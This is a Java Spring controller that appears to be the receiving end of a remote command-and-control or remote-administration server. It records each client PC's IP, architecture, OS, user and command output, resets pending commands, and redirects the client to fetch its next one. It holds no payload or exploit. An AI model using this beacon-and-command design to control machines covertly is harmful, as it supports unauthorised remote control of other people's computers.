package ch.lebois.server.controller;

import ch.lebois.server.data.entity.Client;
import ch.lebois.server.data.entity.Message;
import ch.lebois.server.data.repository.ClientRepository;
import ch.lebois.server.data.repository.MessageRepository;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

import java.sql.Timestamp;
import java.util.Date;

@Controller
@RequestMapping("receiver")
public class ReceiverController {

    private ClientRepository clientRepository;
    private MessageRepository messageRepository;

    public ReceiverController(ClientRepository clientRepository, MessageRepository messageRepository) {
        this.clientRepository = clientRepository;
        this.messageRepository = messageRepository;
    }

    @GetMapping("{pcName}")
    public String getResponse(@PathVariable("pcName") String pcName,
                              @RequestParam("type") String type,
                              @RequestParam("response") String response) {
        Client client;
        try {
            client = clientRepository.findClientByName(pcName);
            client.getName();
        } catch (NullPointerException e) {
            client = new Client();
            client.setName(pcName);
            clientRepository.save(client);
        }

        switch (type) {
            case "reset":
                client.setCommand("");
                clientRepository.save(client);
                break;
            case "ip":
                client.setIp(response);
                break;
            case "arch":
                client.setClientArch(response);
                break;
            case "os":
                client.setOs(response);
                break;
            case "user":
                client.setPcUser(response);
                break;
            case "status":
                break;
            default:
                saveMessage(type, response, client);
                break;
        }
        client.setLastseen(new Timestamp(new Date().getTime()));
        clientRepository.save(client);
        return "redirect:/sender/" + client.getName();
    }

    private void saveMessage(String type, String response, Client client) {
        Message message = new Message();
        message.setType(type);
        message.setMessage(response);
        message.setClient(client);
        messageRepository.save(message);
    }
}
